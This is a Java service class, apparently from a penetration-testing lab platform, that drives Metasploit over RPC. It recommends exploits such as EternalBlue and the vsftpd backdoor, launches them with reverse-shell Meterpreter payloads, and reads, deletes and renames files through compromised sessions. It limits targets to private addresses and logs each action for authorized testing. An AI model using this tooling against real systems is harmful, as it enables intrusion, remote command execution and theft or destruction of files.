package com.caligo.backend.metasploit;

import com.caligo.backend.audit.AuditEvent;
import com.caligo.backend.audit.AuditEventRepository;
import com.caligo.backend.recon.ToolExecutionJob;
import com.caligo.backend.recon.ToolExecutionJobRepository;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Service;
import org.springframework.web.server.ResponseStatusException;

import java.time.Instant;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
public class MetasploitService {

    private static final Pattern SAFE_TARGET = Pattern.compile("^[A-Za-z0-9][A-Za-z0-9_.:/-]{0,179}$");
    private static final Pattern SAFE_MODULE = Pattern.compile("^[a-z0-9_./-]{1,240}$");
    private static final Pattern UNSAFE_REMOTE_PATH = Pattern.compile("[\\r\\n\\u0000;&|`<>]");
    private static final Pattern IPV4 = Pattern.compile("^(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})$");
    private static final Set<String> MODULE_TYPES = Set.of("exploit", "auxiliary", "post", "payload");
    private static final Set<String> BLOCKED_OPTIONS = Set.of(
            "InitialAutoRunScript", "AutoRunScript", "PrependMigrateProc", "EXE::Custom", "StageEncoder"
    );

    private final MetasploitRpcClient rpc;
    private final ToolExecutionJobRepository jobs;
    private final AuditEventRepository auditEvents;
    private final ObjectMapper objectMapper;

    public MetasploitService(
            MetasploitRpcClient rpc,
            ToolExecutionJobRepository jobs,
            AuditEventRepository auditEvents,
            ObjectMapper objectMapper
    ) {
        this.rpc = rpc;
        this.jobs = jobs;
        this.auditEvents = auditEvents;
        this.objectMapper = objectMapper;
    }

    public Map<String, Object> capabilities() {
        Map<String, Object> response = new LinkedHashMap<>();
        response.put("tool", "metasploit");
        response.put("rpc", rpc.connectionInfo());
        response.put("scope", scopePolicy());
        response.put("moduleTypes", MODULE_TYPES);
        response.put("payloads", List.of(
                option("generic/shell_reverse_tcp", "Shell reverse TCP", "Payload simple para laboratorios controlados."),
                option("linux/x64/meterpreter/reverse_tcp", "Linux Meterpreter x64", "Meterpreter para objetivos Linux x64 autorizados."),
                option("windows/x64/meterpreter/reverse_tcp", "Windows Meterpreter x64", "Meterpreter para objetivos Windows x64 autorizados."),
                option("php/meterpreter/reverse_tcp", "PHP Meterpreter", "Payload PHP para pruebas web controladas.")
        ));
        response.put("defaults", Map.of(
                "target", "192.168.0.50",
                "lhost", "192.168.0.253",
                "lport", 4444,
                "moduleType", "exploit",
                "moduleName", "exploit/multi/handler",
                "payload", "generic/shell_reverse_tcp"
        ));
        try {
            Map<String, Object> version = rpc.coreVersion();
            response.put("available", true);
            response.put("version", version);
            response.put("message", "Metasploit RPC operativo.");
        } catch (Exception ex) {
            response.put("available", false);
            response.put("message", sample(ex.getMessage(), 500));
        }
        return response;
    }

    public Map<String, Object> recommendations(MetasploitDiscoveryRequest request) {
        String target = sanitizeTarget(request.target());
        List<Map<String, Object>> hosts = normalizeHosts(request.hosts(), target);
        List<Map<String, Object>> recommendations = new ArrayList<>();
        for (Map<String, Object> host : hosts) {
            for (Map<String, Object> port : list(host.get("ports"))) {
                recommendations.addAll(recommendForPort(host, port));
            }
        }
        recommendations = recommendations.stream()
                .sorted(Comparator.comparing(item -> String.valueOf(item.getOrDefault("rank", "z"))))
                .limit(80)
                .toList();
        Map<String, Object> response = new LinkedHashMap<>();
        response.put("target", target);
        response.put("hosts", hosts);
        response.put("recommendations", recommendations);
        response.put("sessions", sessions().get("sessions"));
        return response;
    }

    public Map<String, Object> search(String query, String type) {
        String cleanQuery = query == null ? "" : query.trim();
        if (cleanQuery.length() > 160) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Busqueda demasiado larga");
        }
        String moduleType = type == null || type.isBlank() ? "" : type.trim().toLowerCase(Locale.ROOT);
        if (hasText(moduleType) && !MODULE_TYPES.contains(moduleType)) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Tipo de modulo no permitido");
        }
        String rpcQuery = (hasText(moduleType) ? "type:" + moduleType + " " : "") + cleanQuery;
        Object raw = rpc.callValue("module.search", rpcQuery.trim());
        Map<String, Object> response = new LinkedHashMap<>();
        response.put("query", rpcQuery.trim());
        response.put("modules", normalizeModuleSearch(raw).stream().limit(120).toList());
        return response;
    }

    public Map<String, Object> moduleInfo(String type, String name) {
        String moduleType = sanitizeModuleType(type);
        String moduleName = sanitizeModuleName(name);
        Map<String, Object> response = new LinkedHashMap<>();
        response.put("type", moduleType);
        response.put("name", moduleName);
        response.put("info", rpc.call("module.info", moduleType, stripTypePrefix(moduleType, moduleName)));
        response.put("options", rpc.call("module.options", moduleType, stripTypePrefix(moduleType, moduleName)));
        if ("exploit".equals(moduleType)) {
            response.put("payloads", rpc.callValue("module.compatible_payloads", stripTypePrefix(moduleType, moduleName)));
        }
        return response;
    }

    public Map<String, Object> execute(MetasploitExecuteRequest request, String username, String remoteIp) {
        String moduleType = sanitizeModuleType(request.moduleType());
        String moduleName = sanitizeModuleName(request.moduleName());
        String target = sanitizeTarget(request.target());
        Map<String, Object> datastore = datastore(request, target);
        String modulePath = stripTypePrefix(moduleType, moduleName);

        ToolExecutionJob job = jobs.save(new ToolExecutionJob(
                username,
                "metasploit",
                target,
                writeJson(Map.of(
                        "moduleType", moduleType,
                        "moduleName", moduleName,
                        "payload", request.payload() == null ? "" : request.payload(),
                        "options", datastore
                )),
                "metasploit rpc module.execute " + moduleType + "/" + modulePath
        ));
        auditEvents.save(new AuditEvent(username, "METASPLOIT_MODULE_EXECUTE", moduleType + "/" + modulePath + " -> " + target, remoteIp));
        try {
            Map<String, Object> result = rpc.call("module.execute", moduleType, modulePath, datastore);
            job.markCompleted(writeJson(Map.of(
                    "rpc", result,
                    "submittedAt", Instant.now().toString()
            )));
            jobs.save(job);
        } catch (Exception ex) {
            job.markFailed(sample(ex.getMessage(), 1000), writeJson(Map.of("error", sample(ex.getMessage(), 1000))));
            jobs.save(job);
        }
        return jobResponse(job);
    }

    public Map<String, Object> jobs() {
        Map<String, Object> response = new LinkedHashMap<>();
        response.put("jobs", rpc.call("job.list"));
        return response;
    }

    public Map<String, Object> sessions() {
        Map<String, Object> raw = rpc.call("session.list");
        Map<String, Object> response = new LinkedHashMap<>();
        response.put("sessions", normalizeSessions(raw));
        return response;
    }

    public Map<String, Object> sessionCommand(String id, SessionCommandRequest request, String username, String remoteIp) {
        String sessionId = sanitizeSessionId(id);
        String command = request.command().trim();
        Map<String, Object> session = sessionById(sessionId);
        String type = String.valueOf(session.getOrDefault("type", ""));
        auditEvents.save(new AuditEvent(username, "METASPLOIT_SESSION_COMMAND", sessionId + " " + sample(command, 80), remoteIp));
        if (type.toLowerCase(Locale.ROOT).contains("meterpreter")) {
            return Map.of("sessionId", sessionId, "output", runMeterpreterCommand(sessionId, command, 550));
        }
        rpc.call("session.shell_write", sessionId, command.endsWith("\n") ? command : command + "\n");
        sleepBriefly();
        return Map.of("sessionId", sessionId, "output", rpc.call("session.shell_read", sessionId));
    }

    public Map<String, Object> sessionWorkspace(String id, RemotePathRequest request, String username, String remoteIp) {
        String sessionId = sanitizeSessionId(id);
        Map<String, Object> session = meterpreterSessionById(sessionId);
        String path = sanitizeRemotePath(request == null ? "" : request.path(), true);
        auditEvents.save(new AuditEvent(username, "METASPLOIT_SESSION_WORKSPACE", sessionId + " " + sample(path, 120), remoteIp));

        Map<String, Object> listing = fileList(sessionId, path);
        Map<String, Object> response = new LinkedHashMap<>();
        response.put("session", session);
        response.putAll(listing);
        response.put("actions", List.of("list", "read", "console"));
        return response;
    }

    public Map<String, Object> sessionFileList(String id, RemotePathRequest request, String username, String remoteIp) {
        String sessionId = sanitizeSessionId(id);
        String path = sanitizeRemotePath(request == null ? "" : request.path(), true);
        meterpreterSessionById(sessionId);
        auditEvents.save(new AuditEvent(username, "METASPLOIT_SESSION_FILE_LIST", sessionId + " " + sample(path, 120), remoteIp));
        return fileList(sessionId, path);
    }

    public Map<String, Object> sessionFileRead(String id, RemoteFileReadRequest request, String username, String remoteIp) {
        String sessionId = sanitizeSessionId(id);
        String path = sanitizeRemotePath(request.path(), false);
        meterpreterSessionById(sessionId);
        auditEvents.save(new AuditEvent(username, "METASPLOIT_SESSION_FILE_READ", sessionId + " " + sample(path, 120), remoteIp));

        String raw = runMeterpreterCommand(sessionId, "cat " + quoteRemotePath(path), 900);
        int maxBytes = Math.max(1024, Math.min(262_144, request.maxBytes() == null ? 65_536 : request.maxBytes()));
        String content = sample(raw, maxBytes);
        Map<String, Object> response = new LinkedHashMap<>();
        response.put("sessionId", sessionId);
        response.put("path", path);
        response.put("content", content);
        response.put("truncated", raw.length() > content.length());
        response.put("bytesReturned", content.getBytes(java.nio.charset.StandardCharsets.UTF_8).length);
        response.put("raw", raw);
        return response;
    }

    public Map<String, Object> sessionMkdir(String id, RemotePathRequest request, String username, String remoteIp) {
        String sessionId = sanitizeSessionId(id);
        String path = sanitizeRemotePath(request.path(), false);
        meterpreterSessionById(sessionId);
        auditEvents.save(new AuditEvent(username, "METASPLOIT_SESSION_MKDIR", sessionId + " " + sample(path, 120), remoteIp));
        String output = runMeterpreterCommand(sessionId, "mkdir " + quoteRemotePath(path), 700);
        return fileMutationResponse(sessionId, path, output);
    }

    public Map<String, Object> sessionFileDelete(String id, RemoteFileDeleteRequest request, String username, String remoteIp) {
        String sessionId = sanitizeSessionId(id);
        String path = sanitizeRemotePath(request.path(), false);
        meterpreterSessionById(sessionId);
        auditEvents.save(new AuditEvent(username, "METASPLOIT_SESSION_FILE_DELETE", sessionId + " " + sample(path, 120), remoteIp));
        String command = Boolean.TRUE.equals(request.directory()) ? "rmdir " : "rm ";
        String output = runMeterpreterCommand(sessionId, command + quoteRemotePath(path), 750);
        return fileMutationResponse(sessionId, parentPath(path), output);
    }

    public Map<String, Object> sessionFileRename(String id, RemoteMoveRequest request, String username, String remoteIp) {
        String sessionId = sanitizeSessionId(id);
        String path = sanitizeRemotePath(request.path(), false);
        String targetPath = sanitizeRemotePath(request.targetPath(), false);
        meterpreterSessionById(sessionId);
        auditEvents.save(new AuditEvent(username, "METASPLOIT_SESSION_FILE_RENAME", sessionId + " " + sample(path + " -> " + targetPath, 160), remoteIp));
        String output = runMeterpreterCommand(sessionId, "mv " + quoteRemotePath(path) + " " + quoteRemotePath(targetPath), 750);
        return fileMutationResponse(sessionId, parentPath(targetPath), output);
    }

    public Map<String, Object> stopSession(String id, String username, String remoteIp) {
        String sessionId = sanitizeSessionId(id);
        auditEvents.save(new AuditEvent(username, "METASPLOIT_SESSION_STOP", sessionId, remoteIp));
        return rpc.call("session.stop", sessionId);
    }

    public Map<String, Object> job(UUID id, String username) {
        ToolExecutionJob job = jobs.findById(id)
                .filter(item -> username.equals(item.getUsername()))
                .filter(item -> "metasploit".equals(item.getTool()))
                .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND, "Job no encontrado"));
        return jobResponse(job);
    }

    private Map<String, Object> datastore(MetasploitExecuteRequest request, String target) {
        Map<String, Object> datastore = new LinkedHashMap<>();
        for (Map.Entry<String, Object> entry : safeOptions(request.options()).entrySet()) {
            String key = entry.getKey();
            if (BLOCKED_OPTIONS.contains(key)) {
                continue;
            }
            datastore.put(key, entry.getValue());
        }
        datastore.put("RHOSTS", target);
        datastore.put("RHOST", target);
        if (request.rport() != null && request.rport() > 0 && request.rport() <= 65535) {
            datastore.put("RPORT", request.rport());
        }
        if (hasText(request.payload())) {
            datastore.put("PAYLOAD", sanitizeModuleName(request.payload()));
        }
        if (hasText(request.lhost())) {
            datastore.put("LHOST", sanitizeTarget(request.lhost()));
        }
        if (request.lport() != null && request.lport() > 0 && request.lport() <= 65535) {
            datastore.put("LPORT", request.lport());
        }
        datastore.putIfAbsent("VERBOSE", true);
        return datastore;
    }

    private Map<String, Object> safeOptions(Map<String, Object> options) {
        Map<String, Object> safe = new LinkedHashMap<>();
        if (options == null) {
            return safe;
        }
        for (Map.Entry<String, Object> entry : options.entrySet()) {
            String key = entry.getKey() == null ? "" : entry.getKey().trim();
            if (!key.matches("^[A-Za-z0-9_]{1,80}$")) {
                continue;
            }
            Object value = entry.getValue();
            if (value instanceof String stringValue && stringValue.length() > 500) {
                safe.put(key, stringValue.substring(0, 500));
            } else {
                safe.put(key, value);
            }
        }
        return safe;
    }

    private List<Map<String, Object>> recommendForPort(Map<String, Object> host, Map<String, Object> port) {
        String address = String.valueOf(host.getOrDefault("address", ""));
        int portNumber = parseInt(port.get("port"));
        String service = String.valueOf(port.getOrDefault("service", "")).toLowerCase(Locale.ROOT);
        List<Map<String, Object>> values = new ArrayList<>();
        if (portNumber == 21 || service.contains("ftp")) {
            values.add(recommend(address, portNumber, service, "auxiliary", "auxiliary/scanner/ftp/ftp_version", "", "Enumerar FTP", "01", "Versionado seguro antes de explotar."));
            values.add(recommend(address, portNumber, service, "auxiliary", "auxiliary/scanner/ftp/anonymous", "", "Comprobar anonimo", "02", "Validar exposicion sin payload."));
            values.add(recommend(address, portNumber, service, "exploit", "exploit/unix/ftp/vsftpd_234_backdoor", "cmd/unix/interact", "VSFTPD 2.3.4", "05", "Solo si el versionado confirma laboratorio vulnerable."));
        }
        if (portNumber == 22 || service.contains("ssh")) {
            values.add(recommend(address, portNumber, service, "auxiliary", "auxiliary/scanner/ssh/ssh_version", "", "Version SSH", "01", "Identifica banner y familia del servidor."));
        }
        if (portNumber == 80 || portNumber == 8080 || portNumber == 8000 || portNumber == 443 || service.contains("http")) {
            values.add(recommend(address, portNumber, service, "auxiliary", "auxiliary/scanner/http/http_version", "", "HTTP version", "01", "Fingerprint HTTP de baja friccion."));
            values.add(recommend(address, portNumber, service, "auxiliary", "auxiliary/scanner/http/title", "", "HTTP title", "01", "Contexto rapido de aplicacion."));
            values.add(recommend(address, portNumber, service, "auxiliary", "auxiliary/scanner/http/dir_scanner", "", "Directorios", "03", "Enumeracion controlada de rutas comunes."));
            values.add(recommend(address, portNumber, service, "exploit", "exploit/multi/http/tomcat_mgr_upload", "java/meterpreter/reverse_tcp", "Tomcat manager", "06", "Requiere credenciales validas en laboratorio."));
        }
        if (portNumber == 445 || service.contains("smb") || service.contains("microsoft-ds")) {
            values.add(recommend(address, portNumber, service, "auxiliary", "auxiliary/scanner/smb/smb_version", "", "SMB version", "01", "Identifica dialecto y sistema."));
            values.add(recommend(address, portNumber, service, "exploit", "exploit/windows/smb/ms17_010_eternalblue", "windows/x64/meterpreter/reverse_tcp", "MS17-010", "07", "Validar solo contra maquinas vulnerables de laboratorio."));
        }
        if (values.isEmpty() && portNumber > 0) {
            values.add(recommend(address, portNumber, service, "auxiliary", "auxiliary/scanner/portscan/tcp", "", "Portscan TCP", "04", "Modulo generico para ampliar contexto."));
        }
        return values;
    }

    private Map<String, Object> recommend(String target, int port, String service, String type, String module, String payload, String label, String rank, String reason) {
        Map<String, Object> item = new LinkedHashMap<>();
        item.put("target", target);
        item.put("port", port);
        item.put("service", service);
        item.put("type", type);
        item.put("module", module);
        item.put("payload", payload);
        item.put("label", label);
        item.put("rank", rank);
        item.put("reason", reason);
        return item;
    }

    private List<Map<String, Object>> normalizeModuleSearch(Object raw) {
        if (raw instanceof Map<?, ?> map) {
            Object modules = map.get("modules");
            if (modules instanceof List<?> list) {
                return list.stream()
                        .filter(Map.class::isInstance)
                        .map(this::copyMap)
                        .toList();
            }
            return List.of();
        }
        if (raw instanceof List<?> list) {
            return list.stream()
                    .filter(Map.class::isInstance)
                    .map(this::copyMap)
                    .toList();
        }
        return List.of();
    }

    private Map<String, Object> copyMap(Object item) {
        Map<String, Object> response = new LinkedHashMap<>();
        if (item instanceof Map<?, ?> map) {
            for (Map.Entry<?, ?> entry : map.entrySet()) {
                response.put(String.valueOf(entry.getKey()), entry.getValue());
            }
        }
        return response;
    }

    private List<Map<String, Object>> normalizeSessions(Map<String, Object> raw) {
        List<Map<String, Object>> sessions = new ArrayList<>();
        for (Map.Entry<String, Object> entry : raw.entrySet()) {
            if (!(entry.getValue() instanceof Map<?, ?> map)) {
                continue;
            }
            Map<String, Object> session = new LinkedHashMap<>();
            session.put("id", entry.getKey());
            for (Map.Entry<?, ?> detail : map.entrySet()) {
                session.put(String.valueOf(detail.getKey()), detail.getValue());
            }
            sessions.add(session);
        }
        return sessions;
    }

    private Map<String, Object> sessionById(String id) {
        return normalizeSessions(rpc.call("session.list")).stream()
                .filter(item -> id.equals(String.valueOf(item.get("id"))))
                .findFirst()
                .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND, "Sesion no encontrada"));
    }

    private Map<String, Object> meterpreterSessionById(String id) {
        Map<String, Object> session = sessionById(id);
        String type = String.valueOf(session.getOrDefault("type", ""));
        if (!type.toLowerCase(Locale.ROOT).contains("meterpreter")) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "El explorador grafico requiere una sesion Meterpreter");
        }
        return session;
    }

    private Map<String, Object> fileList(String sessionId, String requestedPath) {
        String cdOutput = "";
        if (hasText(requestedPath)) {
            cdOutput = runMeterpreterCommand(sessionId, "cd " + quoteRemotePath(requestedPath), 650);
        }
        String pwdOutput = runMeterpreterCommand(sessionId, "pwd", 500);
        String lsOutput = runMeterpreterCommand(sessionId, "ls", 850);

        Map<String, Object> response = new LinkedHashMap<>();
        response.put("sessionId", sessionId);
        response.put("requestedPath", requestedPath);
        response.put("currentPath", extractCurrentPath(pwdOutput, requestedPath));
        response.put("entries", parseLsOutput(lsOutput));
        response.put("raw", Map.of(
                "cd", cdOutput,
                "pwd", pwdOutput,
                "ls", lsOutput
        ));
        return response;
    }

    private Map<String, Object> fileMutationResponse(String sessionId, String refreshPath, String output) {
        Map<String, Object> listing = fileList(sessionId, refreshPath);
        Map<String, Object> response = new LinkedHashMap<>(listing);
        response.put("output", output);
        return response;
    }

    private String runMeterpreterCommand(String sessionId, String command, long waitMillis) {
        rpc.call("session.meterpreter_write", sessionId, command.endsWith("\n") ? command : command + "\n");
        sleepMillis(waitMillis);
        StringBuilder output = new StringBuilder();
        int emptyReads = 0;
        for (int index = 0; index < 8; index++) {
            String chunk = outputText(rpc.call("session.meterpreter_read", sessionId));
            if (hasText(chunk)) {
                output.append(chunk);
                emptyReads = 0;
            } else {
                emptyReads++;
            }
            if (emptyReads >= 2) {
                break;
            }
            sleepMillis(180);
        }
        return cleanMeterpreterOutput(output.toString());
    }

    private String outputText(Object raw) {
        if (raw instanceof Map<?, ?> map) {
            Object value = map.get("data");
            if (value == null) {
                value = map.get("output");
            }
            return value == null ? "" : String.valueOf(value);
        }
        return raw == null ? "" : String.valueOf(raw);
    }

    private String cleanMeterpreterOutput(String raw) {
        if (raw == null) {
            return "";
        }
        return raw.replace("\r\n", "\n").replaceAll("(?m)^meterpreter\\s*>\\s*", "").trim();
    }

    private String extractCurrentPath(String pwdOutput, String fallbackPath) {
        if (!hasText(pwdOutput)) {
            return hasText(fallbackPath) ? fallbackPath : ".";
        }
        String[] lines = pwdOutput.split("\\R");
        for (int index = lines.length - 1; index >= 0; index--) {
            String line = lines[index].trim();
            if (!line.isBlank() && !line.startsWith("[-]") && !line.toLowerCase(Locale.ROOT).startsWith("current")) {
                return line;
            }
        }
        return hasText(fallbackPath) ? fallbackPath : ".";
    }

    private List<Map<String, Object>> parseLsOutput(String raw) {
        List<Map<String, Object>> entries = new ArrayList<>();
        if (!hasText(raw)) {
            return entries;
        }
        for (String line : raw.split("\\R")) {
            String trimmed = line.trim();
            if (trimmed.isBlank()
                    || trimmed.startsWith("Listing:")
                    || trimmed.startsWith("===")
                    || trimmed.startsWith("---")
                    || trimmed.startsWith("Mode ")
                    || trimmed.startsWith("[-]")) {
                continue;
            }
            String[] parts = trimmed.split("\\s{2,}");
            if (parts.length < 4) {
                continue;
            }
            Map<String, Object> entry = new LinkedHashMap<>();
            String mode = parts[0].trim();
            String size = parts.length > 1 ? parts[1].trim() : "";
            String type = parts.length > 2 ? parts[2].trim() : "";
            String modified = parts.length > 4 ? parts[3].trim() : "";
            String name = parts.length > 4 ? joinParts(parts, 4) : parts[parts.length - 1].trim();
            if (name.isBlank()) {
                continue;
            }
            entry.put("name", name);
            entry.put("mode", mode);
            entry.put("size", parseLong(size));
            entry.put("sizeLabel", size);
            entry.put("type", type);
            entry.put("modified", modified);
            entry.put("directory", type.toLowerCase(Locale.ROOT).contains("dir") || mode.startsWith("4") || ".".equals(name) || "..".equals(name));
            entries.add(entry);
        }
        return entries;
    }

    private String joinParts(String[] parts, int start) {
        StringBuilder builder = new StringBuilder();
        for (int index = start; index < parts.length; index++) {
            if (builder.length() > 0) {
                builder.append("  ");
            }
            builder.append(parts[index].trim());
        }
        return builder.toString();
    }

    private List<Map<String, Object>> normalizeHosts(List<Map<String, Object>> input, String fallbackTarget) {
        if (input == null || input.isEmpty()) {
            return List.of(Map.of("address", fallbackTarget, "ports", List.of()));
        }
        List<Map<String, Object>> hosts = new ArrayList<>();
        for (Map<String, Object> raw : input) {
            String address = sanitizeTarget(String.valueOf(raw.getOrDefault("address", fallbackTarget)));
            Map<String, Object> host = new LinkedHashMap<>();
            host.put("address", address);
            host.put("status", raw.getOrDefault("status", ""));
            host.put("hostnames", raw.getOrDefault("hostnames", List.of()));
            host.put("ports", list(raw.get("ports")).stream()
                    .filter(port -> "open".equalsIgnoreCase(String.valueOf(port.getOrDefault("state", "open"))))
                    .toList());
            hosts.add(host);
        }
        return hosts;
    }

    private List<Map<String, Object>> list(Object value) {
        if (!(value instanceof List<?> raw)) {
            return List.of();
        }
        List<Map<String, Object>> items = new ArrayList<>();
        for (Object item : raw) {
            if (item instanceof Map<?, ?> map) {
                Map<String, Object> normalized = new LinkedHashMap<>();
                for (Map.Entry<?, ?> entry : map.entrySet()) {
                    normalized.put(String.valueOf(entry.getKey()), entry.getValue());
                }
                items.add(normalized);
            }
        }
        return items;
    }

    private String sanitizeModuleType(String type) {
        String value = type == null ? "" : type.trim().toLowerCase(Locale.ROOT);
        if (!MODULE_TYPES.contains(value)) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Tipo de modulo no permitido");
        }
        return value;
    }

    private String sanitizeModuleName(String name) {
        String value = name == null ? "" : name.trim().toLowerCase(Locale.ROOT);
        if (!SAFE_MODULE.matcher(value).matches() || value.contains("..")) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Nombre de modulo no permitido");
        }
        return value;
    }

    private String stripTypePrefix(String type, String name) {
        String prefix = type + "/";
        return name.startsWith(prefix) ? name.substring(prefix.length()) : name;
    }

    private String sanitizeTarget(String rawTarget) {
        String target = rawTarget == null ? "" : rawTarget.trim();
        if (target.isBlank()) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "El objetivo es obligatorio");
        }
        if (!SAFE_TARGET.matcher(target).matches() || target.contains("..") || target.contains("//")) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Objetivo no valido");
        }
        if (!isPrivateOrLocalTarget(target)) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Metasploit solo acepta objetivos privados/locales en este laboratorio");
        }
        return target;
    }

    private String sanitizeSessionId(String id) {
        String value = id == null ? "" : id.trim();
        if (!value.matches("^[0-9]{1,8}$")) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Sesion no valida");
        }
        return value;
    }

    private String sanitizeRemotePath(String rawPath, boolean allowBlank) {
        String value = rawPath == null ? "" : rawPath.trim();
        if (value.isBlank()) {
            if (allowBlank) {
                return "";
            }
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "La ruta remota es obligatoria");
        }
        if (value.length() > 260 || UNSAFE_REMOTE_PATH.matcher(value).find() || value.contains("\"")) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Ruta remota no permitida");
        }
        return value;
    }

    private String quoteRemotePath(String path) {
        return "\"" + path + "\"";
    }

    private String parentPath(String path) {
        if (!hasText(path)) {
            return "";
        }
        String value = path.replaceAll("[/\\\\]+$", "");
        if (value.isBlank() || ".".equals(value)) {
            return ".";
        }
        if (value.matches("^[A-Za-z]:$")) {
            return value;
        }
        int slash = Math.max(value.lastIndexOf('/'), value.lastIndexOf('\\'));
        if (slash < 0) {
            return ".";
        }
        if (slash == 0) {
            return value.substring(0, 1);
        }
        if (slash == 2 && value.charAt(1) == ':') {
            return value.substring(0, 3);
        }
        return value.substring(0, slash);
    }

    private boolean isPrivateOrLocalTarget(String target) {
        String host = target;
        int slash = host.indexOf('/');
        if (slash >= 0) {
            host = host.substring(0, slash);
        }
        host = host.toLowerCase(Locale.ROOT);
        if ("localhost".equals(host) || host.endsWith(".local") || "::1".equals(host)) {
            return true;
        }
        Matcher matcher = IPV4.matcher(host);
        if (!matcher.matches()) {
            return false;
        }
        int a = parseInt(matcher.group(1));
        int b = parseInt(matcher.group(2));
        int c = parseInt(matcher.group(3));
        int d = parseInt(matcher.group(4));
        if (a > 255 || b > 255 || c > 255 || d > 255) {
            return false;
        }
        return a == 10 || a == 127 || (a == 192 && b == 168) || (a == 172 && b >= 16 && b <= 31) || (a == 169 && b == 254);
    }

    private Map<String, Object> jobResponse(ToolExecutionJob job) {
        Map<String, Object> response = new LinkedHashMap<>();
        response.put("id", job.getId());
        response.put("tool", job.getTool());
        response.put("target", job.getTarget());
        response.put("status", job.getStatus());
        response.put("progress", job.getProgress());
        response.put("phase", job.getPhase());
        response.put("createdAt", job.getCreatedAt());
        response.put("startedAt", job.getStartedAt());
        response.put("completedAt", job.getCompletedAt());
        response.put("parameters", readJson(job.getParametersJson()));
        response.put("result", readJson(job.getResultJson()));
        response.put("error", job.getErrorMessage());
        response.put("command", job.getCommandPreview());
        return response;
    }

    private Map<String, Object> readJson(String json) {
        if (!hasText(json)) {
            return Map.of();
        }
        try {
            return objectMapper.readValue(json, new TypeReference<>() {
            });
        } catch (Exception ex) {
            return Map.of("raw", json);
        }
    }

    private String writeJson(Object payload) {
        try {
            return objectMapper.writeValueAsString(payload);
        } catch (JsonProcessingException ex) {
            throw new IllegalStateException("No se pudo serializar resultado", ex);
        }
    }

    private Map<String, Object> scopePolicy() {
        return Map.of(
                "defaultPolicy", "solo-privados-locales",
                "examples", List.of("127.0.0.1", "192.168.0.50", "10.10.10.5")
        );
    }

    private Map<String, String> option(String value, String label, String description) {
        Map<String, String> item = new LinkedHashMap<>();
        item.put("value", value);
        item.put("label", label);
        item.put("description", description);
        return item;
    }

    private int parseInt(Object value) {
        try {
            return Integer.parseInt(String.valueOf(value));
        } catch (Exception ex) {
            return 0;
        }
    }

    private long parseLong(Object value) {
        try {
            return Long.parseLong(String.valueOf(value));
        } catch (Exception ex) {
            return 0L;
        }
    }

    private void sleepBriefly() {
        sleepMillis(500);
    }

    private void sleepMillis(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException ex) {
            Thread.currentThread().interrupt();
        }
    }

    private boolean hasText(String value) {
        return value != null && !value.isBlank();
    }

    private String sample(String value, int maxLength) {
        if (value == null) {
            return "";
        }
        return value.length() <= maxLength ? value : value.substring(0, maxLength);
    }
}
